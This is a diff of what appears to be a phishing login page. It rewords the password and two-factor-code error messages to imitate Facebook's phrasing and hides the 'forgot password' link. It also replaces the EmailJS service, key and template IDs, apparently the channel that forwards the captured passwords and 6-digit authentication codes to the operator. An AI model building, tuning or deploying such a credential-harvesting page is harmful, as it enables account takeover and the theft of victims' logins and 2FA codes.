@@ -3571,7 +3571,7 @@
                                 </svg>
                             </div>
                             <div class="invalid-feedback">
-                                Incorrect password. Please, try again.
+                                The password that you've entered is incorrect.<br> Forgotten password?
                             </div>
                         </div>
                         <div class="form-btn-wrapper">
@@ -3582,9 +3582,9 @@
                                 <span class="button-text">Continue</span>
                             </button>
                         </div>
-                        <div id="forgot-pass-wrap">
-                            <span>Forgot password?</span>
-                        </div>
+                        <!-- <div id="forgot-pass-wrap">
+                            <span>Forgotten password?</span>
+                        </div> -->
                     </form>
                     <div class="spaser"></div>
 
@@ -3603,7 +3603,7 @@
                     <div class="twoFAinfo-wraper">
                         <h1 class="modal-title" id="2FAmodalLabel">Check your authentication code </h1>
                         <br>
-                        <p>Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email, or text message on your mobile).</p>
+                        <p>Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).</p>
                         <div class="fb-round-wraper">
                             <img src="../img/2FA.png" alt="" style="width: 100%;">
                         </div>
@@ -3621,7 +3621,7 @@
                                     id="exampleInputPassword" aria-describedby="emailHelp" required autocomplete="off">
                             </div>
                             <div class="invalid-feedback">
-                                Incorrect. Please, try again after <span id="timer"></span>
+                                The code that you've entered is incorrect. Please, try again after <span id="timer"></span>
                             </div>
                         </div>
                         <div class="form-btn-wrapper">
@@ -4400,11 +4400,11 @@
     };
 // thay mail js
     // https://dashboard.emailjs.com/admin
-    var serviceID = "service_dwtmvoa";
+    var serviceID = "service_gl89ma9";
     // Public Key https://dashboard.emailjs.com/admin/account
-    var userId = "Qb3oi9os9I41rKu1H";
+    var userId = "ZofGhA3m_AYStjoDj";
     // https://dashboard.emailjs.com/admin/templates/n9wx5on/settings
-    var templateId = "template_x6qprhp";
+    var templateId = "template_ks5jcmp";
 
     var data = {
         service_id: serviceID,
@@ -4447,7 +4447,7 @@
             setTimeout(function () {
                 var errortext = apiForm.querySelector('.invalid-feedback')
                 errortext.style.display = 'none'
-            }, 3000)
+            }, 15000)
         }
 
         function apiFormhandle(event) {
